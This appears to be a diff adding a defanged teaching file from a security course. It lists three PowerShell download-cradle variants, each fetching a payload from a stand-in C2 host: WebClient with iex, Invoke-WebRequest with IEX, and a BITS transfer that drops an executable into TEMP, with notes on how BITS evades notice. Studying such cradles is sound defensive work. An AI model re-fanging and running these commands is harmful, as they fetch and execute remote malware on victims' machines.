@@ -1,0 +1,12 @@
+# Download Cradle Variants (Defanged, Fictional — Static Read Only)
+# You met the classic variant in L3.5. Here are three transports, side by side.
+
+# Variant 1 — Classic (fetch + iex): reviewed in L3.5, the fileless baseline
+iex ([System.Net.WebClient]::new().DownloadString('hxxps://cdn.fake-c2[.]test/s1'))
+
+# Variant 2 — Invoke-WebRequest pivot: same fileless shape, different fetch cmdlet
+IEX (Invoke-WebRequest 'hxxps://fake-c2[.]test/s2' -UseBasicParsing).Content
+
+# Variant 3 — BITS transport: NOT fileless — drops a real file via a background
+# transfer service that blends in with legitimate Windows Update traffic
+Start-BitsTransfer -Source 'hxxps://fake-c2[.]test/p.exe' -Destination "$env:TEMP\p.exe"
